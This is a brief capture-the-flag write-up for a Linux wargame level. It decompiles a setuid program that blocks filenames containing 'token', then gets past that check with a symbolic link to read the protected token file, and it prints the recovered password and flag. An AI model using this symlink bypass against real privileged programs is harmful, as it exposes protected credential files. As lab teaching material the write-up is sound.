we can see in this level two things a token and an executable who take an argument.
but you dont have rights on the token file.

using Ghidra we can decompilate the exec file and we get this main:


int main(int argc,char **argv,char **envp)

{
  char *pcVar1;
  int __fd;
  size_t __n;
  ssize_t sVar2;
  int in_GS_OFFSET;
  int fd;
  int rc;
  char buf [1024];
  undefined local_414 [1024];
  int local_14;
  
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (argc == 1) {
    printf("%s [file to read]\n",*argv);
                    // WARNING: Subroutine does not return
    exit(1);
  }
  pcVar1 = strstr(argv[1],"token");
  if (pcVar1 != (char *)0x0) {
    printf("You may not access \'%s\'\n",argv[1]);
                    // WARNING: Subroutine does not return
    exit(1);
  }
  __fd = open(argv[1],0);
  if (__fd == -1) {
    err(1,"Unable to open %s",argv[1]);
  }
  __n = read(__fd,local_414,0x400);
  if (__n == 0xffffffff) {
    err(1,"Unable to read fd %d",__fd);
  }
  sVar2 = write(1,local_414,__n);
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    // WARNING: Subroutine does not return
    __stack_chk_fail();
  }
  return sVar2;
}

we now understand the exectuable take as argument the token.
we can also see this line:   pcVar1 = strstr(argv[1],"token");
it means any file with the name token cannot be readen.

we simply need to change the name but we dont have any rights, we can now use symbolic links to open inderectly the token file
so we use:
ln -s ~/token /tmp/exo08

and then go where the executable:
./level08 ../../../tmp/exo08
it returns: quif5eloekouj29ke0vouxean
when you do su level09 and put the password it failed.
so you have to do the old way:
su flag08 and then getflag:
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
